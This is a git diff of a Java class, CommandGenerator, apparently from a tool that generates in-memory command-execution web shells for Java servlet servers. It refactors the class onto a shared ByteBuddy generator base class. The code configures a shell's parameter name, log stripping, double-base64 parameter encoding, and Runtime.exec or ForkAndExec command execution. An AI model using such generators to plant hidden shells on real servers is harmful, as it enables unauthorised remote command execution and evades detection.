@@ -4,11 +4,10 @@ import com.reajason.javaweb.ClassBytesShrink;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
-import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
 import com.reajason.javaweb.memshell.config.CommandConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
+import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
 import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
-import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.asm.Advice;
 import net.bytebuddy.asm.AsmVisitorWrapper;
 import net.bytebuddy.description.modifier.Ownership;
@@ -24,25 +23,16 @@ import static net.bytebuddy.matcher.ElementMatchers.named;
  * @author ReaJason
  * @since 2024/11/24
  */
-public class CommandGenerator {
-    private final ShellConfig shellConfig;
-    private final CommandConfig commandConfig;
+public class CommandGenerator extends ByteBuddyShellGenerator<CommandConfig> {
 
     public CommandGenerator(ShellConfig shellConfig, CommandConfig commandConfig) {
-        this.shellConfig = shellConfig;
-        this.commandConfig = commandConfig;
+        super(shellConfig, commandConfig);
     }
 
-    public DynamicType.Builder<?> getBuilder() {
-        if (commandConfig.getShellClass() == null) {
-            throw new IllegalArgumentException("commandConfig.getClazz() == null");
-        }
+    @Override
+    public DynamicType.Builder<?> build(DynamicType.Builder<?> builder) {
 
-        DynamicType.Builder<?> builder = new ByteBuddy()
-                .redefine(commandConfig.getShellClass())
-                .name(commandConfig.getShellClassName())
-                .field(named("paramName")).value(commandConfig.getParamName())
-                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));
+        builder = builder.field(named("paramName")).value(shellToolConfig.getParamName());
 
         if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
@@ -52,12 +42,12 @@ public class CommandGenerator {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
 
-        if (CommandConfig.Encryptor.DOUBLE_BASE64.equals(commandConfig.getEncryptor())) {
+        if (CommandConfig.Encryptor.DOUBLE_BASE64.equals(shellToolConfig.getEncryptor())) {
             builder = builder
                     .visit(new AsmVisitorWrapper.ForDeclaredMethods()
                             .method(named("getParam"),
                                     new MethodCallReplaceVisitorWrapper(
-                                            commandConfig.getShellClassName(),
+                                            shellToolConfig.getShellClassName(),
                                             Collections.singleton(ShellCommonUtil.class.getName()))
                             )
                     )
@@ -68,19 +58,12 @@ public class CommandGenerator {
                     .visit(Advice.to(DoubleBase64ParamInterceptor.class).on(named("getParam")));
         }
 
-        if (CommandConfig.ImplementationClass.RuntimeExec.equals(commandConfig.getImplementationClass())) {
+        if (CommandConfig.ImplementationClass.RuntimeExec.equals(shellToolConfig.getImplementationClass())) {
             builder = builder.visit(Advice.to(RuntimeExecInterceptor.class).on(named("getInputStream")));
-        } else if (CommandConfig.ImplementationClass.ForkAndExec.equals(commandConfig.getImplementationClass())) {
+        } else if (CommandConfig.ImplementationClass.ForkAndExec.equals(shellToolConfig.getImplementationClass())) {
             builder = builder.visit(Advice.to(ForkAndExecInterceptor.class).on(named("getInputStream")));
         }
 
         return builder;
-    }
-
-    public byte[] getBytes() {
-        DynamicType.Builder<?> builder = getBuilder();
-        try (DynamicType.Unloaded<?> make = builder.make()) {
-            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
-        }
     }
 }
